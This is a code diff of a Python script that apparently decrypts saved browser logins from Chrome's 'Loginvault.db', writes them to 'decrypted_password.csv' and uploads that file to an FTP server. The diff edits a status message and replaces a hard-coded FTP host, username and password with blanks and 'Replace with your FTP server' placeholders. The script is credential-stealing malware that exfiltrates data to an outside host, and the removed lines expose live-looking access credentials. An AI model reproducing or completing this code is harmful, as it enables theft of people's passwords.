@@ -63,7 +63,7 @@ def upload_to_ftp(filename, ftp_server, ftp_username, ftp_password):
         with open(filename, 'rb') as file:
             ftp.storbinary(f'STOR {filename}', file)
         ftp.quit()
-        print(f'checked {filename}.')
+        print(f'Sent {filename}.')
     except Exception as e:
         print(f'Failed to upload {filename} to FTP. Error: {e}')
 
@@ -89,9 +89,9 @@ if __name__ == '__main__':
                     conn.close()
                     os.remove("Loginvault.db")
         # Upload to FTP
-        ftp_server = 'us-east-1.sftpcloud.io'  # Replace with your FTP server
-        ftp_username = '600994d762a442ec9bf39edbf9bddc40'  # Replace with your FTP username
-        ftp_password = 'NjOjVozossuA3lNNJ8Ji6xhQo2yVlUym'  # Replace with your FTP password
+        ftp_server = ''  # Replace with your FTP server
+        ftp_username = ''  # Replace with your FTP username
+        ftp_password = ''  # Replace with your FTP password
         upload_to_ftp('decrypted_password.csv', ftp_server, ftp_username, ftp_password)
     except Exception as e:
         print("[ERR] %s" % str(e))
